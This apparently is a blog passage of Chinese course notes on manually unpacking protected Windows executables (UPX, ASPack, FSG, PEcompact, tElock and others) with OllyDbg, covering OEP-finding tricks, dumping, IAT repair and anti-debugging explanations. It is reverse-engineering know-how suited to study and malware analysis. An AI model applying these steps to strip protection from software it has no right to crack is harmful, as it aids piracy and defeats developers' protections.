class="code"><pre><span class="line">0050A40D   &gt; /E8 1C000000   call 吾爱破解.0050A42E                       ;  PUSH ASCII &quot;Safengine Shielden v2.3.6.0&quot;</span><br><span class="line">0050A412   . |53 61 66 65 6&gt;ascii &quot;Safengine Shield&quot;</span><br><span class="line">0050A422   . |65 6E 20 76 3&gt;ascii &quot;en v2.3.6.0&quot;,0</span><br><span class="line">0050A42E   &gt; |9C            pushfd</span><br></pre></td></tr></table></figure><h1 id="4-脱壳详解"><a href="#4-脱壳详解" class="headerlink" title="4. 脱壳详解"></a>4. 脱壳详解</h1><p>以下脱壳都是用吾爱专用虚拟机进行操作，因为Win7/8/10(以后仅称Win10)脱壳太不友好，导致各种各样的问题出现。比如Win10系统下LoadPE只显示系统进程、脱壳后的程序无法正常运行(原因是ASLR基地址随机化脱壳插件获取的地址不对)，这些问题在XP系统都可以得到解决。</p><p>脱壳后的程序回到Win10运行不了的问题，也是因为ASLR基地址随机化。ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。</p><p>在XP虚拟机用LoadPE和Scylla结合脱壳后的程序，移到Win10就打不开的情况(点击后加载了一下主程序却没出来)。OD载入看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00F42CA0    8BFF            mov edi,edi                              ; dumped_S.&lt;ModuleEntryPoint&gt;</span><br><span class="line">00F42CA2    55              push ebp</span><br><span class="line">00F42CA3    8BEC            mov ebp,esp</span><br><span class="line">00F42CA5    83EC 10         sub esp,0x10</span><br><span class="line">00F42CA8    A1 B0074400     mov eax,dword ptr ds:[0x4407B0]</span><br></pre></td></tr></table></figure><p>下面是XP系统同一代码位置的情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00422CA0    8BFF            mov edi,edi</span><br><span class="line">00422CA2    55              push ebp</span><br><span class="line">00422CA3    8BEC            mov ebp,esp</span><br><span class="line">00422CA5    83EC 10         sub esp,0x10</span><br><span class="line">00422CA8    A1 B0074400     mov eax,dword ptr ds:[0x4407B0]</span><br></pre></td></tr></table></figure><p>发现第5行都是<code>4407B0</code>，肯定不对，推测在Win10下这个偏移地址为<code>F607B0</code>(这个地址还会变，因为每次载入程序地址都会随机化)。为了让程序能在Win10正常运行，只需将文件或系统的ASLR取消即可。最好不要取消系统的ASLR，涉及安全问题。</p><p>取消文件的ASLR的两种方法：</p><ol><li>打开LoadPE-&gt;PE编辑器-&gt;特征值后面三个点-&gt;将重定位已分离勾选-&gt;确定-&gt;保存-&gt;确定</li><li>打开CFF Explorer-&gt;载入文件-&gt;File Header-&gt;Click Here-&gt;将<code>relocation info stripped from file</code>勾选-&gt;OK</li></ol><p>在XP中取消再移到Win10或直接在Win10取消都行。</p><h2 id="4-1-UPX"><a href="#4-1-UPX" class="headerlink" title="4.1 UPX"></a>4.1 UPX</h2><p>做作业前推荐观看ximo脱壳基础——手脱UPX壳</p><img src="/posts/e2d652c5/hw_UPX.png" class="" title="hw_UPX"><p>用ExeinfoPE查壳可知它是UPX壳，并且可以知道区段的名字可以随意改变，所以用区段名字判断它是什么壳其实不准确。UPX脱壳非常简单，只需利用UPX脱壳工具即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">D:\CTF\tools\upx&gt;upx -d 吾爱破解培训第一课作业一.exe -o 1.exe</span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2020</span><br><span class="line">UPX 3.96w       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">upx: 吾爱破解培训第一课作业一.exe: CantUnpackException: file is modified/hacked/protected; take care!!!</span><br><span class="line"></span><br><span class="line">Unpacked 0 files.</span><br></pre></td></tr></table></figure><p>呃…脱壳工具好鸡肋，看了ximo的手脱UPX壳，现在4种方法都来试试吧。</p><h3 id="4-1-1-单步跟踪法"><a href="#4-1-1-单步跟踪法" class="headerlink" title="4.1.1 单步跟踪法"></a>4.1.1 单步跟踪法</h3><p>一路F8，遇到向上跳转不实现，向下跳转忽略。</p><p>遇到向上跳转时，有两种方法饶过：</p><ol><li>选中向上跳转指令的下一条指令F4(运行至光标处)</li><li>选中向上跳转指令的下一条指令F2-&gt;F9-&gt;F2(下断点-&gt;运行-&gt;取消断点)</li></ol><p>如果向上跳转的下一条指令是跳转指令或是call指令，那就在下下一条指令进行操作，以此类推。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00F87757    61              popad</span><br><span class="line">00F87758    8D4424 80       lea eax,dword ptr ss:[esp-0x80]</span><br><span class="line">00F8775C    6A 00           push 0x0</span><br><span class="line">00F8775E    39C4            cmp esp,eax</span><br><span class="line">00F87760  ^ 75 FA           jnz short 吾爱破解.00F8775C</span><br><span class="line">00F87762    83EC 80         sub esp,-0x80</span><br><span class="line">00F87765  - E9 4266FCFF     jmp 吾爱破解.00F4DDAC</span><br></pre></td></tr></table></figure><p>经过漫长的上述重复操作后，终于来到了第7行的大跳转处，大跳转在加壳程序中往往意味着OEP(注意第1行的popad，其它方法会用到)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00F4DDAC    E8 EF4E0000     call 吾爱破解.00F52CA0</span><br><span class="line">00F4DDB1  ^ E9 79FEFFFF     jmp 吾爱破解.00F4DC2F</span><br><span class="line">00F4DDB6    3B0D B007F700   cmp ecx,dword ptr ds:[0xF707B0]</span><br></pre></td></tr></table></figure><p>以上就是真正程序的起始处，结合1所学的各种语言编译后代码的特点，猜测该程序是由VS编译的。</p><h3 id="4-1-2-ESP定律"><a href="#4-1-2-ESP定律" class="headerlink" title="4.1.2 ESP定律"></a>4.1.2 ESP定律</h3><p>入口代码第1行是<code>pushad</code>，经过这一条指令后，在寄存器的ESP右键-&gt;数据窗口中跟随，来到数据窗口，选中第一个hex数据右键-&gt;断点-&gt;硬件访问-&gt;Word(或者在命令窗口输入<code>hr esp</code>回车)，F9运行，取消硬件断点，之后就按照4.1.1的方法走，一直走到OEP。</p><h3 id="4-1-3-2次内存镜像法"><a href="#4-1-3-2次内存镜像法" class="headerlink" title="4.1.3 2次内存镜像法"></a>4.1.3 2次内存镜像法</h3><p><code>M</code>模块查看内存，找到程序领空的<code>.rsrc</code>表，也就是资源表。虽然吾爱把表名改了，但还是可以在包含里看到“资源”字样，就在<code>.cn</code>处。这里注意，如果资源表是单独一个，就用2次内存镜像，如果与其他表合在一起，只用1次内存镜像即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Memory map</span><br><span class="line">地址         大小       属主           区段       包含                         类型   访问    初始访问  已映射为</span><br><span class="line">00160000   00001000   吾爱破解                  PE 文件头                     Imag   R         RWE</span><br><span class="line">00161000   00039000   吾爱破解           www.                                Imag   R         RWE</span><br><span class="line">0019A000   0001E000   吾爱破解       52pojie    SFX,代码                      Imag   R         RWE</span><br><span class="line">001B8000   00005000   吾爱破解            .cn   数据,输入表,资源               Imag   R         RWE</span><br></pre></td></tr></table></figure><p>①如果<code>.rsrc</code>单独一个节，选中<code>.rsrc</code>右键-&gt;在访问上设置中断-&gt;F9。再找一次内存，在PE文件头的下一节地址，也就是161000处下断点，运行，删除断点。</p><p>②如果<code>.rsrc</code>并不是单独一个节，只需在PE文件头的下一节地址，也就是161000处下断点，运行，删除断点。</p><p>之后按照4.1.1的方法走。</p><h3 id="4-1-4-一步直达法"><a href="#4-1-4-一步直达法" class="headerlink" title="4.1.4 一步直达法"></a>4.1.4 一步直达法</h3><p>绝大部分UPX壳和AsPack壳都可以用这种方法。载入OD后可直观看到<code>pushad</code>，既然有<code>pushad</code>那肯定有<code>popad</code>。右键-&gt;查找-&gt;命令，输入<code>popad</code>，不需要勾选整个块。之后与4.1.1同。</p><p>在虚拟机的OD找到OEP后，三种方法dump下来。</p><p>①用OllyDump插件，起始地址是<code>E</code>模块的第一行的<code>00400000</code>，大小为<code>5D000</code>，OEP的地址为<code>0041DDAC</code>，修正的是偏移地址，所以是<code>0041DDAC-00400000=1DDAC</code>，代码基址和数据基址可以在<code>M</code>模块看，代码基址是<code>3A000</code>，数据基址是<code>58000</code>。用方式1脱壳，保存为<code>ODdump1.exe</code>，可以运行，载入exeinfoPE说有不知名的壳在保护，但点一下插件Advanced Scan就可看到是由VS2008编译的。</p><img src="/posts/e2d652c5/ODdump1.jpg" class="" title="ODdump1"><p>在PEID可以直接看到是由VS2008编译的。</p><img src="/posts/e2d652c5/ODdump11.jpg" class="" title="ODdump11"><p><code>ODdump1.exe</code>载入OD后还是显示有压缩代码的存在。</p><img src="/posts/e2d652c5/ODdump12.jpg" class="" title="ODdump12"><p>那UPX壳到底有没有脱干净呢？其实只要脱壳后的程序可以正常运行，OEP入口代码为无壳代码特征，IAT解密完资源没有被压缩即可。 </p><p>②用OllyDump插件，与①完全相同，只是用方式2脱壳，保存为<code>ODdump2.exe</code>，不可运行。</p><img src="/posts/e2d652c5/ODdump2.jpg" class="" title="ODdump2"><p>③打开LoadPE，找到OD进程，右键-&gt;修复镜像大小-&gt;右键-&gt;完整转存，将正在调试的程序完整地转存下来，自动生成一个<code>dumped.exe</code>文件，不可运行，壳还没脱。<strong>注意，先别关掉OD。</strong>打开ImportREC，找到原本的程序(不是<code>dumped.exe</code>)，将OEP改为<code>1DDAC</code>-&gt;自动查找IAT-&gt;获取输入表，没有无效函数，转储到文件，选中<code>dumped.exe</code>打开，会自动生成一个<code>dumped_.exe</code>。这时，<code>dumped_.exe</code>可以运行。</p><img src="/posts/e2d652c5/dumped.jpg" class="" title="dumped"><img src="/posts/e2d652c5/dumped1.jpg" class="" title="dumped1"><img src="/posts/e2d652c5/dumped_.jpg" class="" title="dumped_"><h2 id="4-2-ASPacK"><a href="#4-2-ASPacK" class="headerlink" title="4.2 ASPacK"></a>4.2 ASPacK</h2><img src="/posts/e2d652c5/ASPacK.png" class="" title="ASPacK"><p>ASPacK壳都可以用以上4种方法。现在用单步跟踪法温故知新。F8运行到第2行主程序就出来了，也就是我们所说的“跑飞了”。所以要F7跟进去，以后同理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00430001 &gt;  60              pushad</span><br><span class="line">00430002    E8 03000000     call QQ个性网.0043000A</span><br><span class="line">00430007  - E9 EB045D45     jmp 45A004F7</span><br></pre></td></tr></table></figure><p>单步跟踪法与F7、F8结合，运行至<code>retn</code>指令后出来的就是真正程序开始的地方。</p><p>在一步直达法查找<code>popad</code>时会遇到很多个<code>popad</code>可能都不是我们需要的，在不知道哪个是我们所要的<code>popad</code>情况下，最好不要用这种方法。</p><h3 id="4-2-1-模拟跟踪法"><a href="#4-2-1-模拟跟踪法" class="headerlink" title="4.2.1 模拟跟踪法"></a>4.2.1 模拟跟踪法</h3><p>模拟跟踪法包括SFX模拟跟踪都是让OD自动查找程序OEP。</p><p><code>M</code>模块，在程序领空找到包含SFX的区段的地址。在命令窗口输入<code>tc eip &lt; 包含SFX的区段的地址</code>回车，OD会自动跟踪OEP，但这个过程可能会有点漫长。跟踪完后OD会跳到<code>C</code>模块的某条指令上，这条指令可能是OEP，也可能是将要到OEP，需要单步跟踪到达OEP。</p><h3 id="4-2-2-SFX模拟跟踪"><a href="#4-2-2-SFX模拟跟踪" class="headerlink" title="4.2.2 SFX模拟跟踪"></a>4.2.2 SFX模拟跟踪</h3><p>选项-&gt;调试设置-&gt;SFX，选块方式跟踪或字节方式跟踪，视情况而定。重载后自动跳到OEP或将要到OEP处。</p><h2 id="4-3-nsPack"><a href="#4-3-nsPack" class="headerlink" title="4.3 nsPack"></a>4.3 nsPack</h2><img src="/posts/e2d652c5/nsPack.png" class="" title="nsPack"><p>nsPack壳是北斗的壳，可以用上面6种方法手动脱壳，过程与脱ASPacK壳一样。</p><p>nsPack壳作业用①方法用PEID查壳第一行Unknown，第二行显示VS2008，程序正常运行，载入OD也正常。用②方法查壳同①，程序不能正常运行，错误提示“应用程序正常初始化(0xc0000005)失败”，这时用importREC自动查找IAT就可正常运行，载入OD正常。用③方法全部同①。</p><h2 id="4-4-FSG-2-0"><a href="#4-4-FSG-2-0" class="headerlink" title="4.4 FSG 2.0"></a>4.4 FSG 2.0</h2><img src="/posts/e2d652c5/FSG.png" class="" title="FSG"><h3 id="4-4-1-单步跟踪法"><a href="#4-4-1-单步跟踪法" class="headerlink" title="4.4.1 单步跟踪法"></a>4.4.1 单步跟踪法</h3><p>单步跟踪到这三个连续跳转处，第1行代码向上跳，绕过。第2行代码跳到1D4地址处，刚好绕过第3行的大跨度跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">004001CD  ^\78 F3           js short qqspirit.004001C2</span><br><span class="line">004001CF    75 03           jnz short qqspirit.004001D4</span><br><span class="line">004001D1  - FF63 0C         jmp dword ptr ds:[ebx+0xC]               ; qqspirit.0040A86D</span><br><span class="line">004001D4    50              push eax                                 ; qqspirit.0042CBC6</span><br></pre></td></tr></table></figure><p>选中1D1地址，F4运行至此处。F8就跳到了OEP。</p><h3 id="4-4-2-ESP定律"><a href="#4-4-2-ESP定律" class="headerlink" title="4.4.2 ESP定律"></a>4.4.2 ESP定律</h3><p>在程序起始处执行到的第一个<code>push</code>指令后，用ESP定律法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00400154 &gt;  8725 04A24700   xchg dword ptr ds:[0x47A204],esp</span><br><span class="line">0040015A    61              popad</span><br><span class="line">0040015B    94              xchg eax,esp</span><br><span class="line">0040015C    55              push ebp</span><br><span class="line">0040015D    A4              movs byte ptr es:[edi],byte ptr ds:[esi]</span><br></pre></td></tr></table></figure><p>之后同单步跟踪。</p><h3 id="4-4-3-特殊的ESP定律"><a href="#4-4-3-特殊的ESP定律" class="headerlink" title="4.4.3 特殊的ESP定律"></a>4.4.3 特殊的ESP定律</h3><p>FSG 2.0专用的ESP定律。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00400154 &gt;  8725 04A24700   xchg dword ptr ds:[0x47A204],esp</span><br><span class="line">0040015A    61              popad</span><br><span class="line">0040015B    94              xchg eax,esp</span><br></pre></td></tr></table></figure><p>执行到<code>popad</code>后(程序起始处就有<code>popad</code>而没有<code>pushad</code>)，查看堆栈窗口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0047A208   004001E8  qqspirit.004001E8</span><br><span class="line">0047A20C   004001DC  qqspirit.004001DC</span><br><span class="line">0047A210   004001DE  qqspirit.004001DE</span><br><span class="line">0047A214   0040A86D  qqspirit.0040A86D</span><br></pre></td></tr></table></figure><p>顺数第4行就是OEP。选中右键-&gt;在反汇编窗口中跟随，发现在反汇编窗口全是空代码，右键-&gt;断点-&gt;硬件执行，F9运行(或Shift+F9)即可看到代码。如果反汇编窗口中还是看到类似于数据的东西，右键-&gt;分析-&gt;从模块中删除分析就可看到代码了。</p><p>用脱壳的三种方法脱壳后程序查壳都显示完美脱壳了，是由V6编译的。</p><img src="/posts/e2d652c5/fsgoddump1.jpg" class="" title="fsgoddump1"><p>然而三个都不能正常运行，那可能需要我们手动修复IAT。在真正程序段随便找一个call或mov系统函数的偏移地址，比如425210，它的函数名<code>kernel32.GetVersion</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0040A86D  /.  55            push ebp                                 ;  oleaut32.770F0000</span><br><span class="line">0040A86E  |.  8BEC          mov ebp,esp</span><br><span class="line">0040A870  |.  6A FF         push -0x1</span><br><span class="line">0040A872  |.  68 78794200   push qqspirit.00427978</span><br><span class="line">0040A877  |.  68 F4E14000   push qqspirit.0040E1F4                   ;  SE 处理程序安装</span><br><span class="line">0040A87C  |.  64:A1 0000000&gt;mov eax,dword ptr fs:[0]</span><br><span class="line">0040A882  |.  50            push eax</span><br><span class="line">0040A883  |.  64:8925 00000&gt;mov dword ptr fs:[0],esp</span><br><span class="line">0040A88A  |.  83EC 58       sub esp,0x58</span><br><span class="line">0040A88D  |.  53            push ebx                                 ;  qqspirit.0047A208</span><br><span class="line">0040A88E  |.  56            push esi                                 ;  qqspirit.0042C0C8</span><br><span class="line">0040A88F  |.  57            push edi                                 ;  qqspirit.004252AC</span><br><span class="line">0040A890  |.  8965 E8       mov [local.6],esp</span><br><span class="line">0040A893  |.  FF15 10524200 call dword ptr ds:[0x425210]             ;  kernel32.GetVersion</span><br></pre></td></tr></table></figure><p>可以在importREC中填好OEP-&gt;自动查找IAT-&gt;获取输入表，验证虚拟地址为25210处是否为<code>GetVersion</code>函数。</p><img src="/posts/e2d652c5/GetVersion.jpg" class="" title="GetVersion"><p>在OD的命令窗口输入<code>d 425210</code>回车，数据窗口会刷新数据，右键-&gt;长型-&gt;地址，程序中所有函数全都显示出来了。往上滑动记下第一个函数地址<code>425000</code>(再往上全是0)，往下滑动记下最后一个<code>kernel32</code>系列函数的下一个地址<code>425284</code>。</p><p>回到importREC填入RVA<code>25000</code>，大小<code>425284-425000=284</code>(比较偷懒的做法就是将大小写成1000或1500，但会产生很多垃圾指针)，获取输入表-&gt;显示无效函数，无效函数少的话可以直接选中无效函数右键-&gt;剪切指针，转储到文件。这时的<code>dumped_.exe</code>可以正常运行了。(无效函数多的话右键-&gt;跟踪级别1或跟踪级别3跟一下，或者右键-&gt;插件跟踪)</p><p>由于OllyDump是很久远的插件了，所以对现在的脱壳不太友好，最好是用③方法脱壳。而在③方法中importREC最好换成Scylla用作IAT修复，因为ImpREC对一些新系统的API支持不好。</p><p>Scylla用法跟importREC差不多，但是OEP要填<code>40A86D</code>，VA填<code>425000</code>，大小与importREC一样，同样操作，修复转储后文件。</p><h2 id="4-5-PEcompact"><a href="#4-5-PEcompact" class="headerlink" title="4.5 PEcompact"></a>4.5 PEcompact</h2><img src="/posts/e2d652c5/PEcompact.png" class="" title="PEcompact"><p>PEcompact壳可以用单步跟踪、ESP定律、2次内存镜像法。</p><p>使用单步跟踪时，与ASPacK一样都会跑飞，只需F7进入函数即可。</p><p>使用ESP定律时，执行完两个<code>push</code>指令后再进行ESP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0040A86D &gt;  B8 74DE4500     mov eax,qqspirit.0045DE74</span><br><span class="line">0040A872    50              push eax                                 ; qqspirit.0045DE74</span><br><span class="line">0040A873    64:FF35 0000000&gt;push dword ptr fs:[0]</span><br><span class="line">0040A87A    64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br></pre></td></tr></table></figure><p>使用2次内存镜像法时，程序跳到此处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0045DE89    C602 E9         mov byte ptr ds:[edx],0xE9</span><br><span class="line">0045DE8C    83C2 05         add edx,0x5</span><br><span class="line">0045DE8F    2BCA            sub ecx,edx                              ; qqspirit.0040A883</span><br><span class="line">0045DE91    894A FC         mov dword ptr ds:[edx-0x4],ecx           ; qqspirit.0045DE97</span><br><span class="line">0045DE94    33C0            xor eax,eax</span><br><span class="line">0045DE96    C3              retn</span><br><span class="line">0045DE97    B8 F9CB45F0     mov eax,0xF045CBF9</span><br></pre></td></tr></table></figure><p>如果执行<code>retn</code>再单步跟踪，程序跑飞。所以要在<code>retn</code>指令的下一条指令下断点运行，再单步跟踪到OEP。</p><h3 id="4-5-1-使用VirtualFree"><a href="#4-5-1-使用VirtualFree" class="headerlink" title="4.5.1 使用VirtualFree"></a>4.5.1 使用VirtualFree</h3><p>方法一：在命令窗口输入<code>bp VirtualFree</code>回车，运行。取消断点，Alt+F9返回到用户代码处。右键-&gt;查找-&gt;命令，输入<code>push 8000</code>(特征码)，取消勾选整个块，F4运行至此处，单步跟踪。</p><p>方法二：在命令窗口输入<code>bp VirtualFree</code>回车，两次F9运行。取消断点，Alt+F9返回到用户代码处。单步跟踪。</p><h3 id="4-5-2-使用VirtualAlloc"><a href="#4-5-2-使用VirtualAlloc" class="headerlink" title="4.5.2 使用VirtualAlloc"></a>4.5.2 使用VirtualAlloc</h3><p>在命令窗口输入<code>bp VirtualAlloc</code>回车，运行。取消断点，Alt+F9返回到用户代码处。单步跟踪。</p><h3 id="4-5-3-使用GetVersion"><a href="#4-5-3-使用GetVersion" class="headerlink" title="4.5.3 使用GetVersion"></a>4.5.3 使用GetVersion</h3><p>在命令窗口输入<code>at GetVersion</code>回车，反汇编窗口跳到相关代码处，F2-&gt;F9-&gt;F2。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">7C81127A &gt;  64:A1 18000000  mov eax,dword ptr fs:[0x18]</span><br><span class="line">7C811280    8B48 30         mov ecx,dword ptr ds:[eax+0x30]</span><br><span class="line">7C811283    8B81 B0000000   mov eax,dword ptr ds:[ecx+0xB0]</span><br><span class="line">7C811289    0FB791 AC000000 movzx edx,word ptr ds:[ecx+0xAC]</span><br><span class="line">7C811290    83F0 FE         xor eax,-0x2</span><br><span class="line">7C811293    C1E0 0E         shl eax,0xE</span><br><span class="line">7C811296    0BC2            or eax,edx                               ; ntdll.KiFastSystemCallRet</span><br><span class="line">7C811298    C1E0 08         shl eax,0x8</span><br><span class="line">7C81129B    0B81 A8000000   or eax,dword ptr ds:[ecx+0xA8]</span><br><span class="line">7C8112A1    C1E0 08         shl eax,0x8</span><br><span class="line">7C8112A4    0B81 A4000000   or eax,dword ptr ds:[ecx+0xA4]</span><br><span class="line">7C8112AA    C3              retn</span><br></pre></td></tr></table></figure><p>一直单步到<code>retn</code>处返回父函数。往上滑动发现OEP，父函数就是真正代码处。</p><h3 id="4-5-4-最后一次异常法"><a href="#4-5-4-最后一次异常法" class="headerlink" title="4.5.4 最后一次异常法"></a>4.5.4 最后一次异常法</h3><p>选项-&gt;调试设置-&gt;异常，将所有选项取消勾选。插件-&gt;StrongOD-&gt;skip some exceptions取消勾选。重新载入，按Shift+F9几次，直至出现主程序。</p><p>比如在ximo教程中是按了Shift+F9两次后跑飞，所以可知主程序在第一次Shift+F9到第二次Shift+F9的代码之间。重新载入，去到倒数第二次的Shift+F9处，在堆栈窗口查看标有<code>SE处理程序</code>(一般是第二行)的数值<code>0045DE74</code>，在反汇编窗口Ctrl+G查找<code>0045DE74</code>，下断点，Shift+F9运行，取消断点。这就来到了与2次镜像内存法一样的地址处，单步跟踪，也要绕过<code>retn</code>指令。</p><h3 id="4-5-5-PEcompact的第一条指令"><a href="#4-5-5-PEcompact的第一条指令" class="headerlink" title="4.5.5 PEcompact的第一条指令"></a>4.5.5 PEcompact的第一条指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040A86D &gt;  B8 74DE4500     mov eax,qqspirit.0045DE74</span><br></pre></td></tr></table></figure><p>加壳程序的第一条指令就是将偏移地址<code>0045DE74</code>赋值给eax。在命令窗口输入<code>bp 0045DE74</code>回车-&gt;运行-&gt;取消断点。后面步骤与2次镜像内存法一样的地址处，单步跟踪，也要绕过<code>retn</code>指令。</p><h2 id="4-6-EZIP"><a href="#4-6-EZIP" class="headerlink" title="4.6 EZIP"></a>4.6 EZIP</h2><p>这个可以用单步跟踪和ESP定律。这次主要讲脱壳后程序崩溃问题。用③方法脱壳没有问题，而用①和②方法都出现了找不到dll的问题。</p><img src="/posts/e2d652c5/%E6%B2%A1%E6%9C%89%E6%89%BE%E5%88%B0dll.png" class="" title="没有找到dll"><p>此时，只要打开LoadPE分别将<code>oddump1.exe</code>和<code>oddump2.exe</code>重建PE即可。</p><h2 id="4-7-tElock-0-98b1"><a href="#4-7-tElock-0-98b1" class="headerlink" title="4.7 tElock 0.98b1"></a>4.7 tElock 0.98b1</h2><p>这个壳可以用最后一次异常法、模拟跟踪法、2次内存镜像法。</p><p>这个程序中很多的花指令以及SEH暗桩。</p><p>花指令是，由设计者特别构思，希望使反汇编的时候出错，让破解者无法清楚正确地反汇编程序的内容，迷失方向。经典的是，目标位置是另一条指令的中间，这样在反汇编的时候便会出现混乱。花指令有可能利用各种指令：jmp, call, ret的一些堆栈技巧，位置运算，等等。</p><p>花指令是程序中的无用代码，程序对它没影响，少了它也能正常运行。加花指令后，杀毒软件对木马静态反汇编时，木马的代码就不会正常显示出来，加大杀毒软件的查杀难度。</p><p>SEH，结构化异常处理，是WINDOWS中异常处理的机制，简单地说，就是操作系统维护一个用来处理异常的函数指针的链表，如果发生异常，系统就会顺着这个链表去调用其中的函数，直到某个异常处理函数将异常处理完了，或者所有的函数都不处理异常。</p><p>使用SEH的机制来进制反调试，就是SEH暗桩。</p><p>程序可以将特定的代码注册成为异常处理函数，然后故意产生一些异常。当程序被调试时，所有的异常事件，都会先发由调试器进行处理，调试器可以决定是否处理，以及如何处理；如果调试器决定不处理，程序自己注册的异常处理入口才会得到执行。对于调试器，并不能保证所有的异常都正确的识别并恰当地处理（因此OD中的很多插件都有anti-anti功能），如果因为调试器对异常情况识别有误，那么程序就会执行完全不同的一条执行路径，这样程序就可以知道自己正在被调试了。</p><h3 id="4-7-1-最后一次异常法"><a href="#4-7-1-最后一次异常法" class="headerlink" title="4.7.1 最后一次异常法"></a>4.7.1 最后一次异常法</h3><p>选项-&gt;调试设置-&gt;异常，将所有选项取消勾选。插件-&gt;StrongOD-&gt;skip some exceptions取消勾选。重新载入，按17次Shift+F9出现主程序。</p><p>重载，按16次Shift+F9后，观察堆栈窗口的<code>SE处理程序</code>数值为0042D7FD。在反汇编窗口下断点Shift+F9运行，取消断点。之后用单步跟踪。</p><h3 id="4-7-2-模拟跟踪法"><a href="#4-7-2-模拟跟踪法" class="headerlink" title="4.7.2 模拟跟踪法"></a>4.7.2 模拟跟踪法</h3><p>使用模拟跟踪法的前提是没有SEH暗桩。而这个程序有很多SEH暗桩。我们知道，按16次Shift+F9没有出现主程序，而在第17次出现主程序，所以第16次到第17次的这一段是没有SEH暗桩的。所以连续按16次Shift+F9再使用模拟跟踪法。</p><h3 id="4-7-3-2次内存镜像法"><a href="#4-7-3-2次内存镜像法" class="headerlink" title="4.7.3 2次内存镜像法"></a>4.7.3 2次内存镜像法</h3><p>2次内存镜像法即可到达OEP。</p><p>用①方法脱壳出现问题：</p><img src="/posts/e2d652c5/%E6%97%A0%E6%B3%95%E5%AE%9A%E4%BD%8D%E7%A8%8B%E5%BA%8F%E8%BE%93%E5%85%A5%E7%82%B9%E4%BA%8E%E5%8A%A8%E6%80%81%E5%BA%93.png" class="" title="无法定位程序输入点于动态库"><p>可以用importREC修复。打开原加壳程序(因为用OD进程会卡死)，填好OEP-&gt;自动查找IAT-&gt;获取输入表，显示无效函数，发现有非常多的无效函数，选中右键-&gt;插件跟踪-&gt;tElock 0.98，让它自动修复无效函数，修复完后还有5个无效函数，右键-&gt;剪切指针。转储到文件，程序正常运行。</p><p>用②③方法直接崩溃不出现弹窗。用importREC进行上述修复后同样可以正常运行。</p><h2 id="4-8-exe32pack"><a href="#4-8-exe32pack" class="headerlink" title="4.8 exe32pack"></a>4.8 exe32pack</h2><p>可以用ESP定律。</p><h3 id="4-8-1-使用IsDebuggerPresent"><a href="#4-8-1-使用IsDebuggerPresent" class="headerlink" title="4.8.1 使用IsDebuggerPresent"></a>4.8.1 